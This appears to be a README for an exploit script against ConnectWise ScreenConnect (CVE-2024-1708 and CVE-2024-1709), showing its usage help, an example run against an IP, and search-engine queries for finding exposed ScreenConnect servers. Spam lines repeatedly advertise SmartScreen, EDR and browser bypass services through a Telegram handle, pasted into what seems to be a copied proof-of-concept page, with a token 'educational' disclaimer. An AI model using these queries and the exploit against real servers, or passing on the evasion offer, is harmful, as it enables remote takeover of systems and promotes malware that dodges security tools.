screenconnect 
smart screen bypass 
edr bypasswith life time ev
chrome edge bypass


![](https://github.com/W01fh4cker/ScreenConnect-AuthBypass-POC-EXP/assets/101872898/9f9be7be-d607-4fcf-97dc-2d8a4939db5e)




Most welcome for free demo /test 

my telegram - @antivirusbypaas



```text
python ScreenConnect-AuthBypass-RCE.py -h

usage: ScreenConnect-AuthBypass-RCE.py [-h] [-u USERNAME] [-p PASSWORD] -t TARGET [-d DOMAIN] [--proxy PROXY]
                                                                                                             
CVE-2024-1708 && CVE-2024-1709 --> RCE!!!                                                                    
                                                                                                             
optional arguments:                                                                                          
  -h, --help            show this help message and exit                                                      
  -u USERNAME, --username USERNAME                                                                           
                        username you want to add                                                             
  -p PASSWORD, --password PASSWORD
                        password you want to add
  -t TARGET, --target TARGET
                        target url
  -d DOMAIN, --domain DOMAIN
                        Description of domain
  --proxy PROXY         eg: http://127.0.0.1:8080
```
For example:
```shell
python ScreenConnect-AuthBypass-RCE.py -t http://192.168.9.100
```



Most welcome for free demo /test 

my telegram - @antivirusbypaas



The specific reasons can be found at:  

> https://screenconnect.product.connectwise.com/communities/1/topics/1653-whitelist-custom-extensions-in-65
>
> https://bishopfox.com/blog/connectwise-control-advisory
>
> https://www.connectwise.com/globalassets/media/documents/connectwisecontrolsecurityevaluationmatrix.pdf

![](https://github.com/W01fh4cker/ScreenConnect-AuthBypass-RCE/assets/101872898/379191d2-862f-4a02-876f-850a771c1ddf)

If you can get a legal signature, please file issues, thank you very much.

# Cyberspace mapping statement

## Odin

```
services.modules.http.headers.server:"screenconnect"
```

## Zoomeye
```
app:"ScreenConnect Remote Management Software"
```

## Censys

```
services.http.response.headers:(key: `Server` and value.headers: `ScreenConnect`)
```

## Shodan

```
"Server: ScreenConnect"
```

## Hunter.how

```
product.name="ConnectWise ScreenConnect software"
```

## Fofa

```
app="ScreenConnect-Remote-Support-Software"
```

This is only for educational purpose any harm caused by you i'm not responsible 

Most welcome for free demo /test 

my telegram - @antivirusbypaas                                                 
